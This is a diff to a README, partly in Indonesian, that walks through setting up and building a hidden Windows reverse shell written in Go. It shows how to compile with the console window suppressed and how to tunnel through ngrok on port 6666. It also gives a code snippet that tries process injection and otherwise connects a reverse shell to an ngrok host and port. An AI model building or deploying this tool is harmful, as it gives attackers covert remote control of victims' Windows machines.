@@ -35,7 +35,11 @@ install golang
 set GOPATH
 ```bash
 windows: setx GOPATH %USERPROFILE%\go
-
+linux: nano ~/.bashrc
+# Go Environment Variables
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/go
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
 ```
 
 Install Dependencies
@@ -45,5 +49,24 @@ go get golang.org/x/sys/windows
 go get golang.org/x/sys/windows/registry
 
 ```
+Buka File hiddenWindowsRevshell.txt and paste terminal
 
+```bash
+go build -ldflags="-H=windowsgui" k0m1t3dc.go
+```
 
+download ngrok untuk tunneling
+```bash
+https://ngrok.com/download/windows
+```
+
+Running ngrok + paste di file k0m1t3dc.go
+```bash
+ngrok tcp 6666
+	if attemptInjection() {
+		fmt.Println("[+] Successfully injected into system process")
+	} else {
+		fmt.Println("[+] Starting reverse shell...")
+    go reverse("tcp://0.tcp.ap.ngrok.io:14399") <--paste here
+	}
+```
